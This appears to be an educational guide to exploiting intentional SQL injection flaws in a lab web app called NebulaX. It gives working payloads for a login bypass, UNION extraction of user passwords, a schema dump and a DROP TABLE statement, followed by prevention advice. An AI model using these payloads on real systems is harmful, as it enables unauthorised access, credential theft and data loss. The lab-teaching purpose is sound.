# SQL Injection Exploitation Guide for NebulaX Web3 Lab

This guide demonstrates how to exploit the intentional SQL injection vulnerabilities in the NebulaX application for educational purposes only.

## Vulnerable Endpoints

The application contains the following vulnerable endpoints:

1. **Search Function**: `GET /api/submitMemo?search=<query>`
2. **Login Function**: `POST /api/login` with JSON body `{"username": "<value>", "password": "<value>"}`
3. **Add Memo Function**: `POST /api/submitMemo` with JSON body `{"nftId": <number>, "memo": "<value>"}`

## Exploitation Methods

### 1. Basic Authentication Bypass in Login

The login endpoint is vulnerable to SQL injection in both the username and password fields.

**Exploitation Steps:**

1. Open the login page at `http://localhost:3000/login`
2. In the username field, enter: `admin' --`
3. Enter any value for password (it will be ignored)
4. Click Login

**How it Works:**

The original query:
```sql
SELECT id, username, email, is_admin FROM users WHERE username = 'INPUT_USERNAME' AND password = 'INPUT_PASSWORD'
```

With the payload `admin' --`:
```sql
SELECT id, username, email, is_admin FROM users WHERE username = 'admin' --' AND password = 'anything'
```

The `--` comments out the rest of the query, bypassing the password check.

### 2. Extracting Data from Other Tables via Search

The search function in NFT Notes can be exploited to extract data from other tables, including sensitive user information.

**Exploitation Steps:**

1. Go to the NFT Notes page at `http://localhost:3000/nft-notes`
2. In the search field, enter: `' UNION SELECT id, username, password, email FROM users --`
3. Press Enter to submit the search

**How it Works:**

The original query:
```sql
SELECT * FROM memos WHERE memo LIKE '%INPUT_SEARCH%'
```

With the payload:
```sql
SELECT * FROM memos WHERE memo LIKE '%' UNION SELECT id, username, password, email FROM users --%'
```

This will return all users' credentials mixed in with the memo results.

### 3. Extracting Database Schema Information

To discover the database structure:

**Exploitation Steps:**

1. Go to the NFT Notes page
2. Enter in the search field: `' UNION SELECT 1, name, sql, 4 FROM sqlite_master WHERE type='table' --`

**How it Works:**

This will extract the table structure and schema from SQLite's system tables.

### 4. Inserting Malicious Content via the Add Memo Function

The Add Memo function is vulnerable both in the nftId and memo fields.

**Exploitation Steps:**

1. Go to the NFT Notes page
2. Enter any number for NFT ID
3. In the Note Content field, enter: `'); DROP TABLE memos; --`
4. Submit the form

**How it Works:**

The original query:
```sql
INSERT INTO memos (nftId, memo) VALUES (INPUT_NFT_ID, 'INPUT_MEMO')
```

With the payload:
```sql
INSERT INTO memos (nftId, memo) VALUES (123, ''); DROP TABLE memos; --')
```

This will execute multiple SQL statements, potentially causing data loss.

## Prevention Measures

To fix these vulnerabilities in a real application:

1. **Use Parameterized Queries**: Always use prepared statements or parameterized queries
   ```javascript
   db.run("INSERT INTO memos (nftId, memo) VALUES (?, ?)", [nftId, memo]);
   ```

2. **Implement Input Validation**: Validate all user inputs before processing them

3. **Apply Least Privilege**: Ensure database users have only the permissions they need

4. **Implement WAF**: Use a Web Application Firewall to detect and block SQL injection attempts

5. **Regular Security Audits**: Conduct regular code reviews and security audits

## Disclaimer

This guide and the intentional vulnerabilities are for educational purposes only. Attempting these techniques on production systems without explicit permission is illegal and unethical. 